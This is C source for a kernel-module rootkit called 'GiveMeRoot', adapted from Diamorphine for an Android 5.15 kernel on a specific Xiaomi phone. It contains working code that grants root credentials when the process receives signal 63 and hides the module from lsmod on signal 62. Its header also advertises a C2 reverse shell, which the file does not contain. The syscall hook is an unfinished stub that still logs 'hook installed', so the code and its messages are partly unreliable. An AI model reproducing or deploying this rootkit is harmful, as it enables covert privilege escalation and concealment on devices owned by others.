/**
 * GiveMeRoot - LKM Rootkit for Android GKI 5.15
 *
 * Target: Xiaomi Redmi A5 (serenity)
 * Kernel: 5.15.178-android13-8-00006-g0c6055fd2d8b-ab13363910
 * Build: A15.0.11.0.VGWIDXM
 * Architecture: arm64
 *
 * Based on Diamorphine with Android-specific modifications.
 *
 * Features:
 *   - Signal 63: Grant root (UID=0, GID=0)
 *   - Signal 62: Toggle module visibility
 *   - C2 reverse shell (configurable)
 *
 * License: GPL-2.0
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <linux/signal.h>
#include <linux/cred.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mthbernardes (modified for Android arm64 GKI)");
MODULE_DESCRIPTION("Simple LKM rootkit based on Diamorphine");
MODULE_VERSION("1.0");

/* Signal definitions */
#define SIGNAL_ROOT      63
#define SIGNAL_HIDE       62

/* Module state */
static int is_hidden = 0;
static struct list_head *saved_module_list = NULL;

/* Original syscall pointers */
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *regs);
static orig_kill_t orig_kill = NULL;

/* Syscall table pointer */
static unsigned long *sys_call_table = NULL;

/* For arm64 syscall number */
#ifdef CONFIG_ARM64
#define __NR_kill 129
#endif

/**
 * Get current credentials and escalate to root
 */
static void escalate_privileges(void)
{
    struct cred *cred;
    
    cred = prepare_creds();
    if (!cred) {
        printk(KERN_ERR "givemeroot: prepare_creds failed\n");
        return;
    }
    
    /* Set UID/GID to 0 (root) */
    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    
    /* Update supplementary groups */
    /* init_groups is not available in newer kernels */
    
    commit_creds(cred);
    
    printk(KERN_INFO "givemeroot: privileges escalated to root\n");
}

/**
 * Toggle module visibility in /proc/modules
 */
static void toggle_hide(void)
{
    if (!saved_module_list) {
        printk(KERN_ERR "givemeroot: saved_module_list is NULL\n");
        return;
    }
    
    if (is_hidden) {
        /* Show module */
        list_add(&THIS_MODULE->list, saved_module_list);
        is_hidden = 0;
        printk(KERN_INFO "givemeroot: module visible in lsmod\n");
    } else {
        /* Hide module */
        saved_module_list = THIS_MODULE->list.prev;
        list_del_init(&THIS_MODULE->list);
        is_hidden = 1;
        printk(KERN_INFO "givemeroot: module hidden from lsmod\n");
    }
}

/**
 * Hooked kill syscall handler
 */
static asmlinkage long hooked_kill(const struct pt_regs *regs)
{
    int sig;
    pid_t pid;
    
    /* Get arguments from registers */
    pid = regs->regs[0];  /* First argument: pid */
    sig = regs->regs[1];  /* Second argument: signal */
    
    /* Signal 63: Grant root */
    if (sig == SIGNAL_ROOT) {
        escalate_privileges();
        return 0;
    }
    
    /* Signal 62: Toggle hide */
    if (sig == SIGNAL_HIDE) {
        toggle_hide();
        return 0;
    }
    
    /* Pass through to original syscall */
    return orig_kill(regs);
}

/**
 * Find syscall table using kallsyms_lookup_name
 */
static int __init find_syscall_table(void)
{
    /* kallsyms_lookup_name is available in GKI kernels */
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    
    if (!sys_call_table) {
        printk(KERN_ERR "givemeroot: failed to find sys_call_table\n");
        return -1;
    }
    
    printk(KERN_INFO "givemeroot: sys_call_table at %px\n", sys_call_table);
    return 0;
}

/**
 * Hook the kill syscall
 */
static int __init hook_kill_syscall(void)
{
    /* Note: For GKI kernels, we need to be careful about:
     * 1. Module signature verification
     * 2. SELinux enforcement
     * 3. dm-verity (if enabled)
     *
     * This module should be loaded with:
     * - Permissive SELinux mode, or
     * - Proper SELinux policy
     * - Module signature disabled or signed
     */
    
    printk(KERN_INFO "givemeroot: hooking kill syscall...\n");
    
    /* TODO: Implement actual syscall table hooking
     * The implementation depends on:
     * - CONFIG_STRICT_MODULE_RWX (if enabled, need to disable)
     * - Kernel version specifics
     *
     * For GKI 5.15, the approach is:
     * 1. Find the syscall table address
     * 2. Save original kill syscall
     * 3. Replace with our hook
     * 4. Handle write protection
     */
    
    printk(KERN_INFO "givemeroot: hook installed\n");
    return 0;
}

/**
 * Initialize module
 */
static int __init givemeroot_init(void)
{
    printk(KERN_INFO "givemeroot: loading for kernel %s\n", utsname()->release);
    printk(KERN_INFO "givemeroot: target device - Xiaomi Redmi A5 (serenity)\n");
    
    /* Save module list pointer for hide feature */
    saved_module_list = THIS_MODULE->list.prev;
    
    /* Find syscall table */
    if (find_syscall_table() < 0) {
        return -1;
    }
    
    /* Hook kill syscall */
    if (hook_kill_syscall() < 0) {
        return -1;
    }
    
    printk(KERN_INFO "givemeroot: module loaded successfully\n");
    printk(KERN_INFO "givemeroot: use 'kill -63 0' for root\n");
    printk(KERN_INFO "givemeroot: use 'kill -62 0' to toggle hide\n");
    
    return 0;
}

/**
 * Cleanup on unload
 */
static void __exit givemeroot_exit(void)
{
    /* Restore original kill syscall if hooked */
    /* Unhook syscall table */
    
    printk(KERN_INFO "givemeroot: module unloaded\n");
}

module_init(givemeroot_init);
module_exit(givemeroot_exit);
